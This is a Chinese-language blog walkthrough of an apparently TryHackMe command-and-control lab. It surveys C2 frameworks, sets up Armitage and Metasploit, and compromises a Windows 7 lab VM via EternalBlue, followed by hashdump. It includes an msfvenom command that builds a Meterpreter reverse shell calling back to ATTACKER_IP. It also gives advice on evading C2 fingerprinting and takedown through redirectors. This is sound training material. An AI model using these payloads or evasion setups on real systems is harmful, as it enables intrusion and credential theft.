<p>在任务 7 中，我们将解释和探索另一种称为“重定向器”的技术。我们将获得配置 Metasploit 和 Apache 2 的实践经验，以演示如何设置重定向器。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948401.png" alt="image-20240710110838507"></p>
<h1 id="0x03-常见c2框架">0x03 常见C2框架</h1>
<h2 id="常见-c2-框架">常见 C2 框架</h2>
<p>在您的整个旅程中，您可能会遇到许多不同的 C2 框架；我们将讨论一些被红队成员和对手广泛使用的流行 C2 框架。我们将把它分为两个部分：</p>
<ul>
<li>Free</li>
<li>Premium/Paid 高级/付费</li>
</ul>
<p>您可能会问一些问题，例如“为什么我要使用高级或付费 C2 框架？”，这是一个很好的问题。高级/付费 C2 框架通常不太可能被反病毒供应商检测到。这并不是说它不可能被检测到，只是开源 C2 项目一般都很好理解，并且可以轻松开发签名。</p>
<p>通常，高级 C2 框架通常具有更高级的后开发模块、旋转功能，甚至开源软件开发人员有时可能无法满足的功能请求。例如，Cobalt Strike 提供的一项功能是从信标打开 VPN 隧道的能力，而大多数其他 C2 框架都没有。如果代理在您的特定情况下不能很好地工作，这可能是一个很棒的功能。您必须进行研究，找出最适合您的团队的方法。</p>
<h2 id="免费-c2-框架">免费 C2 框架</h2>
<h3 id="metasploit">Metasploit</h3>
<p>由 Rapid7 开发和维护的 <a target="_blank" rel="noopener" href="https://www.metasploit.com/">Metasploit</a> 框架是最流行的利用和后利用框架 (C2) 之一，该框架是公开可用的，并且安装在大多数渗透测试发行版上。</p>
<h3 id="armitage">Armitage</h3>
<p>Metasploit 框架的扩展 - 它添加了图形用户界面并用 Java 编写，与 Cobalt Strike 非常相似。这是因为它们都是由 Raphael Mudge 开发的。 Armitage 提供了一种简单的方法来枚举和可视化所有目标。除了看起来很像 Cobalt Strike 之外，它甚至还提供了一些独特的功能。其中最受欢迎的一项可以在“攻击”菜单中找到；此功能称为万福玛丽攻击，它尝试对特定工作站上运行的服务运行所有漏洞利用。 Armitage 确实是“快速而简单的黑客攻击”。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948403.png" alt="image-20240710111146468"></p>
<h3 id="powershell-empirestarkiller">Powershell Empire/Starkiller</h3>
<p><a target="_blank" rel="noopener" href="https://bc-security.gitbook.io/empire-wiki/">Powershell Empire</a> 和 <a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY/Starkiller">Starkiller</a> 是另一个非常受欢迎的 C2，最初由 Veris Group 的 Harmjoy、Sixdub 和 Enigma0x3 创建。目前，该项目已停止，并已由 BC 安全团队（Cx01N、Hubbl3 和 _Vinnybod）接手。 Empire 的特点是使用多种语言编写的代理，兼容多种平台，使其成为一款极其通用的 C2。有关 Empire 的更多信息，我们建议您查看 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/rppsempire">Powershell Empire</a> 房间。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948404.png" alt="image-20240710111245351"></p>
<h3 id="covenant">Covenant</h3>
<p>Ryan Cobb 的 <a target="_blank" rel="noopener" href="https://github.com/cobbr/Covenant">Covenant</a> 是我们将介绍的最后一个免费 C2 框架 - 到目前为止，它是用 C# 编写的最独特的 C2 框架之一。与 Metasploit/Armitage 不同，它主要用于通过具有高度可定制代理的 HTTP、HTTPS 和 SMB 侦听器进行后利用和横向移动</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948405.png" alt="image-20240710111320091"></p>
<h3 id="sliver">Sliver</h3>
<p><a target="_blank" rel="noopener" href="https://bishopfox.com/">Bishop Fox</a> 的 <a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver">Sliver</a> 是一个先进的、高度可定制的多用户、基于 CLI 的 C2 框架。 Sliver 是用 Go 编写的，这使得对 C2“植入物”进行逆向工程变得异常困难。它支持各种 C2 通信协议，例如 WireGuard、mTLS、HTTP(S)、DNS 等。此外，它还支持用于附加功能的 BOF 文件、用于屏蔽 C2 通信的 DNS Canary 域、用于 HTTPS 信标的自动 Let’s Encrypt 证书生成等等。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948406.png" alt="image-20240710111435928"></p>
<h2 id="付费-c2-框架">付费 C2 框架</h2>
<h3 id="cobalt-strike">Cobalt Strike</h3>
<p>Help Systems 的 <a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">Cobalt Strike</a>（以前由 Raphael Mudge 创建）可以说是仅次于 Metasploit 的最著名的命令和控制框架之一。与 Artimage 非常相似，它是用 Java 编写的，并且设计得尽可能灵活。有关更多信息，请参阅 Cobalt Strike 的<a target="_blank" rel="noopener" href="https://www.youtube.com/playlist?list=PLcjpg2ik7YT6H5l9Jx-1ooRYpfvznAInJ">视频培训页面</a>。它提供了 Raphael Mudge 本人对红队运作和框架的更多见解。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948407.png" alt="image-20240710111637118"></p>
<h3 id="brute-ratel">Brute Ratel</h3>
<p>Chetan Nayak 或 Paranoid Ninja 开发的 <a target="_blank" rel="noopener" href="https://bruteratel.com/">Brute Ratel</a> 是一个指挥和控制框架，被宣传为“可定制的指挥和控制中心”或“C4”框架，它提供了真正的对手模拟体验，是一个独特的 C2 框架。有关该框架的更多信息，作者提供了一个<a target="_blank" rel="noopener" href="https://bruteratel.com/tabs/tutorials/">视频培训页面</a>，其中演示了该框架中的许多功能。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948408.png" alt="image-20240710111757482"></p>
<h2 id="其他-c2-框架">其他 C2 框架</h2>
<p>有关 C2 框架及其功能的更全面列表，请查看“<a target="_blank" rel="noopener" href="https://howto.thec2matrix.com/">C2 Matrix</a>”，这是由 Jorge Orchilles 和 Bryson Bort 维护的项目。它有一个更全面的列表，列出了当前可用的几乎所有 C2 框架。我们强烈建议您在本次会议结束后，去查看并探索本次会议中未讨论的其他一些 C2 框架。</p>
<h1 id="0x04-设置-c2-框架">0x04 设置 C2 框架</h1>
<p>让我们设置一个 C2 服务器</p>
<p>为了更好地了解设置和管理 C2 服务器的要求，我们将使用 Armitage。提醒一下，Armitage 是 Metasploit 框架的 GUI，因此，它几乎具有标准 C2 框架的所有方面。</p>
<p><em>注意：如果您使用 AttackBox，您可以跳到准备我们的环境部分。</em></p>
<h2 id="设置-armitage">设置 Armitage</h2>
<p>下载、构建和安装 Armitage（以下是根据THM进行的，但尝试下来有错误，建议kali的话直接利用apt-get安装）</p>
<p>首先，我们必须从 Gitlab 克隆存储库：</p>
<pre><code class="hljs scss">git clone https://gitlab.com/kalilinux/packages/armitage.git &amp;&amp; cd armitage</code></pre>
<p>接下来，我们必须构建当前版本；我们可以使用以下命令来做到这一点：</p>
<pre><code class="hljs scss">bash package<span class="hljs-selector-class">.sh</span></code></pre>
<p>鉴于这一步无法正确执行，我就不再展示了。</p>
<h2 id="teamserver">Teamserver</h2>
<p>该文件将启动多个用户能够连接的 Armitage 服务器。该文件有两个参数：</p>
<ul>
<li>IP Address IP地址</li>
</ul>
<p>您的红队操作员同伴将使用该 IP 地址连接到您的 Armitage 服务器。</p>
<ul>
<li>Shared Password 共享密码</li>
</ul>
<p>您的红队操作员同伴将使用共享密码访问您的 Armitage 服务器。</p>
<p>这是您将用于连接到 Armitage Teamserver 的文件。执行二进制文件后，将打开一个新的提示符，显示连接信息和您的用户名（这应该被视为昵称，而不是用于身份验证的用户名）和密码。</p>
<p>这里kali的话，直接执行armitage即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948409.png" alt="image-20240710150228174"></p>
<h2 id="准备我们的环境">准备我们的环境</h2>
<p>在启动 Armitage 之前，我们必须进行一些运行前检查，以确保 Metasploit 配置正确。 Armitage 严重依赖 Metasploit 的数据库功能，因此我们必须在启动 Armitage 之前启动并初始化数据库。为此，我们必须执行以下命令：</p>
<p>这里我执行的是：</p>
<pre><code class="hljs scss">systemctl start postgresql &amp;&amp; systemctl status postgresql
msfdb init</code></pre>
<p>最后，我们必须初始化数据库，以便 Metasploit 可以使用它。需要注意的是，在尝试初始化 Metasploit 数据库时，您不能成为 root 用户。在 AttackBox 上，您必须使用 Ubuntu 用户。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948410.png" alt="image-20240710152626200"></p>
<p>初始化完成后，我们终于可以启动Armitage Team Server了。</p>
<h2 id="启动并连接到-armitage">启动并连接到 Armitage</h2>
<p>当操作 C2 框架时，您永远不想公开暴露管理接口；您应该始终在本地界面上监听，而不是面向公众的界面。这使得其他运营商的访问变得复杂。幸运的是，有一个简单的解决方案。对于要访问服务器的操作员，您应该为他们创建一个新的用户帐户并在服务器上启用 SSH 访问，他们将能够转发 TCP/55553 的 SSH 端口。 Armitage 明确拒绝用户监听 127.0.0.1；这是因为它本质上是一个带有“冲突消除服务器”的共享 Metasploit 服务器，当多个用户连接到该服务器时，您不会看到其他用户看到的所有内容。使用 Armitage，您必须监听 tun0/eth0 IP 地址。</p>
<p>不过这里需要先利用teamserver启动RPC，不过直接启动armitage，无脑跟着提示走也可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948411.png" alt="image-20240710153724870"></p>
<p>这里我打开也是有一些报错，最后重新输入armitage，啥也不修改直接连接，发现成功了（虽然还有点报错）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948412.png" alt="image-20240710155944116"></p>
<p>现在 Armitage 已设置并正常工作，在下一个任务中，我们将了解有关安全访问 Armitage（如上所述）、创建侦听器、各种侦听器类型、生成有效负载等等的更多信息！</p>
<h1 id="0x05-c2操作基础">0x05 C2操作基础</h1>
<h2 id="访问和管理您的-c2-基础设施">访问和管理您的 C2 基础设施</h2>
<p>现在我们已经了解了如何设置 C2 服务器，我们将介绍您在访问 C2 服务器时应该了解的一些基本操作细节。请务必注意，您不需要在此任务中执行任何操作 - 这是为了获得一般经验并熟悉命令和控制框架。</p>
<h3 id="基本操作安全">基本操作安全</h3>
<p>我们在上一节中简要讨论了这一点；您永远不应该直接访问您的 C2 管理界面。这主要是为了您提高操作安全性。对 C2 服务器进行指纹识别非常容易。例如，在 3.13 之前的版本中，Cobalt Strike C2 服务器能够通过 HTTP 响应末尾的额外空格 (\x20) 进行识别。使用这种策略，许多蓝队成员可以对所有可公开访问的 Cobalt Strike C2 服务器进行指纹识别。有关指纹识别和识别 Cobalt Strike C2 服务器的更多信息，请查看 <a target="_blank" rel="noopener" href="https://www.recordedfuture.com/cobalt-strike-servers/">Recorded Future</a> 博客上发布的这篇文章。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948413.png" alt="image-20240710160448288"></p>
<h3 id="访问本地监听的远程-c2-服务器">访问本地监听的远程 C2 服务器</h3>
<p>本节将重点介绍如何通过 SSH 端口转发安全地访问您的 C2 服务器；如果您之前使用 SSH 进行过端口转发，请随意跳过本节，您可能不会学到任何新东西。对于那些不熟悉的人来说，SSH 端口转发允许我们通过将本地端口转发到远程服务器来托管远程计算机上的资源，或者允许我们访问我们正在连接的远程计算机上的本地资源。在某些情况下，这可能是为了绕过防火墙。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948414.png" alt="image-20240710160627100"></p>
<p>或者，在我们的例子中，这可以是出于操作安全原因而完成的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948415.png" alt="image-20240710160657668"></p>
<p>现在我们已经更好地理解了为什么要转发 SSH 端口，让我们回顾一下如何进行。</p>
<p>在我们从任务 4 设置的 C2 中，我们的 Teamserver 正在 TCP/55553 上侦听本地主机。为了访问远程端口 55553，我们必须设置本地端口转发，将本地端口转发到远程 Teamserver 服务器。我们可以使用 SSH 客户端上的 -L 标志来做到这一点：</p>
<p>我们强烈建议为必须侦听公共接口的 C2 服务器设置防火墙规则，以便只有目标用户才能访问您的 C2 服务器。有多种方法可以做到这一点。如果您托管云基础设施，则可以设置安全组或使用基于主机的防火墙解决方案（例如 UFW 或 IPTables）。</p>
<h3 id="在armitage简历监听器">在Armitage简历监听器</h3>
<p>接下来，我们将讨论所有 C2 服务器都有的主题 - 这就是侦听器创建。为了紧扣主题，我们将演示如何使用 Armitage 设置基本侦听器，然后探索您可能在其他各种 C2 框架中遇到的一些其他理论侦听器。让我们创建一个在 TCP/31337 上运行的基本 Meterpreter 监听器。首先，单击 Armitage 下拉菜单并转到“Listeners”部分；您应该看到三个选项：绑定、反向和设置 LHOST。 Bind指的是Bind Shell；您必须连接到这些主机。 Reverse指的是标准Reverse Shell；这是我们将使用的选项。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948416.png" alt="image-20240710161002356"></p>
<p>单击“反向”后，将打开一个新菜单，提示您配置有关侦听器的一些基本详细信息，特别是您要侦听的端口以及要选择的侦听器类型。有两个选项可供选择：“Shell”或“Meterpreter”。 Shell是指标准的netcat风格的反向shell，Meterpreter是标准的Meterpreter反向shell。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948417.png" alt="image-20240710161045293"></p>
<p>设置侦听器后，您可以使用 MSFvenom 生成标准 windows/meterpreter/reverse_tcp 反向 shell，并将 LHOST 设置为 Armitage 服务器以接收对 Armitage 服务器的回调。</p>
<h3 id="获得回调">获得回调</h3>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">5555</span> -f exe -o shell<span class="hljs-selector-class">.exe</span></code></pre>
<p>使用 MSFVenom 生成 windows/meterpreter/reverse_tcp 后，我们可以将有效负载传输到目标机器并执行它。一两分钟后，您应该会收到机器的回调。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948418.png" alt="image-20240710162530360"></p>
<h2 id="监听器类型">监听器类型</h2>
<p>如前所述，标准反向 shell 侦听器并不是唯一存在的侦听器。有许多品种使用许多不同的协议；但是，我们将介绍一些常见的问题，如下所示：</p>
<h3 id="standard-listener">Standard Listener</h3>
<p>These often communicate directly over a raw TCP or UDP socket, sending commands in cleartext. Metasploit has full support for generic listeners.<br>
它们通常通过原始 TCP 或 UDP 套接字直接通信，以明文发送命令。 Metasploit 完全支持通用侦听器。</p>
<h3 id="httphttps-listeners">HTTP/HTTPS Listeners</h3>
<p>These often front as some sort of Web Server and use techniques like Domain Fronting or Malleable C2 profiles to mask a C2 server. When specifically communicating over HTTPS, it’s less likely for communications to be blocked by an NGFW. Metasploit has full support for HTTP/HTTPS listeners.<br>
这些通常作为某种 Web 服务器前端，并使用域前端或可延展 C2 配置文件等技术来掩盖 C2 服务器。当专门通过 HTTPS 进行通信时，通信被 NGFW 阻止的可能性较小。 Metasploit 完全支持 HTTP/HTTPS 侦听器。</p>
<h3 id="dns-listener">DNS Listener</h3>
<p>DNS 监听器是一种流行的技术，专门用于渗透阶段，通常需要设置额外的基础设施，或者至少必须购买和注册域名，并且必须配置公共 NS 服务器。借助其他工具，可以在 Metasploit 中设置 DNS C2 操作。有关更多信息，请参阅 Alexey Sintsov 和 Maxim Andreyanov 的“<a target="_blank" rel="noopener" href="https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf">Meterpreter over DNS</a>”演示。这些对于绕过网络代理通常非常有用。</p>
<h3 id="smb-listener">SMB Listener</h3>
<p>通过 SMB 命名管道进行通信是一种流行的选择方法，尤其是在处理受限网络时；它通常可以实现更灵活的旋转，多个设备相互通信，并且只有一个设备通过 HTTP/HTTPS 等更常见的协议进行回传。 Metasploit 支持命名管道。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948419.png" alt="image-20240710162946434"></p>
<h1 id="0x06-命令-控制和征服">0x06 命令、控制和征服</h1>
<h2 id="漏洞利用示例">漏洞利用示例</h2>
<h3 id="使用-armitage-进行主机枚举">使用 Armitage 进行主机枚举</h3>
<p>在让您自己开始之前，我们将演示如何利用示例虚拟机。首先，我们将在 Armitage 中执行端口扫描，方法是转到“主机”部分，将鼠标悬停在“Nmap Scan”上，然后选择“快速扫描”。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948420.png" alt="image-20240710163553711"></p>
<p>选择“快速扫描”后，会弹出一个新选项；这将提示您输入要扫描的 IP 地址范围。您应在此框中输入已部署虚拟机的 IP 地址。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948421.png" alt="image-20240710163602299"></p>
<p>按“确定”后，等待一两分钟，您应该会看到一个名为“nmap”的新选项卡打开，并且“工作区”窗口中显示一个新计算机。在“nmap”选项卡中，您将看到原始扫描结果。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948422.png" alt="image-20240710163610132"></p>
<p>现在您已经了解了如何执行基本端口扫描，请尝试对目标执行各种其他扫描，并查看可以从主机检索哪些附加信息。</p>
<p>提示：全面扫描将抓取横幅、枚举软件版本、枚举操作系统版本等等！</p>
<h3 id="armitage-的利用">Armitage 的利用</h3>
<p>接下来，我们将展示 Armitage 的利用；在我们的示例中，我们的受害者是一台 Windows 7 计算机（更具体地说，是 Blue）。该机器容易受到经典漏洞“Eternal Blue”的攻击。为了找到这一点，我们将重点关注最右侧的文件夹选项卡，我们将展开“漏洞利用”下拉列表，然后找到“Windows”下拉列表，然后找到“SMB”下拉列表，然后您将看到所有漏洞利用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948423.png" alt="image-20240710163643501"></p>
<p>接下来，您可以双击您选择的漏洞利用程序，或将漏洞利用程序拖放到主机上，然后将打开一个新窗口。单击“启动”将触发漏洞利用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948424.png" alt="image-20240710163651284"></p>
<p>单击“启动”后，您会注意到打开了一个新的“漏洞利用”选项卡。 Armitage 将运行 Metasploit 通常执行的所有常规检查。对于“永恒之蓝”，它运行标准检查脚本，然后运行漏洞利用脚本，直到获得成功的 shell。值得注意的是，在这个漏洞利用中，它默认选择了 Bind shell。确保您完全阅读了漏洞利用信息和选项，以查看是否可以选择 Bind Shell 或 Reverse Shell。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948425.png" alt="image-20240710163657499"></p>
<p>收到 shell 后，右键单击主机并选择“交互”。这将打开一个您熟悉的标准 shell。为了获得 Meterpreter shell，我们建议您运行 multi/manage/shell_to_meterpreter 模块。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948426.png" alt="image-20240710163708915"></p>
<h3 id="practice-time">Practice Time</h3>
<p>现在您已经了解了如何使用 Armitage 来利用主机，现在您将可以通过使用 Metasploit 和 Armitage 攻击虚拟机来练习您的技能。您可以遵循多种利用路径。我们鼓励您探索可能找到的各种利用路径，以便更好地了解 Metasploit 和 Armitage 中的利用和后利用模块。提醒一下，Armitage 只是带有 GUI 的 Metasploit；所有相同的漏洞都存在并且以相同的方式分类。</p>
<h3 id="解决方案">解决方案</h3>
<p>如果您在破坏计算机时遇到困难，请参阅以下使用 Metasploit 破坏虚拟机的分步指南。如果您想使用 Armitage，请使用<a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1u-YmWl7cx3tO2vVjon0EtOGLXVCak2SJ/view?usp=sharing">本指南</a>，其中显示了分步说明。现在进入 Metasploit！</p>
<p>我们的第一步是启动 Metasploit：msfconsole -q</p>
<p>之后直接打永恒之蓝module，配置好选项直接打</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948427.png" alt="image-20240710184819086"></p>
<p>getshell之后，我们成功为管理员权限</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948428.png" alt="image-20240710185043534"></p>
<p>hashdump转储用户的NTLM哈希值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948429.png" alt="image-20240710185333690"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948430.png" alt="image-20240710185340143"></p>
<p>以下是利用armitage攻击示例</p>
<p>首先namp扫描</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948431.png" alt="image-20240710183729924"></p>
<p>发现端口开放，找到exploit模块中的永恒之蓝利用payload</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948432.png" alt="image-20240710184010539"></p>
<p>双击打开，配置好IP端口等信息，launch开始攻击</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948433.png" alt="image-20240710184113630"></p>
<p>如上图，成功getshell，可以右键靶机，进行交互式shell连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948434.png" alt="image-20240710184245445"></p>
<h1 id="0x07-高级c2设置">0x07 高级C2设置</h1>
<h2 id="总是有改进的空间">总是有改进的空间</h2>
<p>正如您可能已经猜到的那样，Metasploit 本身并不是用于高级对手操作的 C2 服务器。它并不像人们所希望的那样灵活；您无法将代理配置为每 X 秒发出一次信标，并出现 Y 抖动。下一代防火墙可以快速捕获此 C2 流量，因为它是持续不断的流量。此外，任何人都可以连接到 HTTP/HTTPS 侦听器并相对快速地了解正在发生的情况。</p>
<h2 id="c2-重定向器">C2 重定向器</h2>
<h3 id="什么是重定向器">什么是重定向器</h3>
<p>在我们深入配置重定向器之前，首先，它是什么？重定向器正如其听起来一样。它是一个根据 HTTP 请求正文中的信息“重定向”HTTP/HTTPS 请求的服务器。在生产系统中，您可能会看到负载均衡器形式的“重定向器”。该服务器通常运行 Apache 2 或 NGINX。在本实验中，我们将利用 Apache 及其一些模块来构建重定向器。</p>
<p>回到 Metasploit，在此任务中，我们可以在 Metasploit 上设置一些基本配置，以允许更高级的配置；我们将设置一个重定向器。通常，此配置是在多个主机上设置的；这样做的目的是隐藏真正的命令和控制服务器。下图说明了受害者和 C2 服务器之间的通信是如何发生的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948435.png" alt="image-20240710190007809"></p>
<p>通常，当您有 C2 回调时，您可以将回调主机设置为域，例如 <a target="_blank" rel="noopener" href="http://admin.tryhackme.com">admin.tryhackme.com</a>。当用户提出投诉时，您的 C2 服务器被举报是很常见的情况。通常，服务器很快就会被关闭。有时短则 3 小时，长则 24 小时。设置重定向器可确保您在参与过程中收集的任何信息都是安全可靠的。</p>
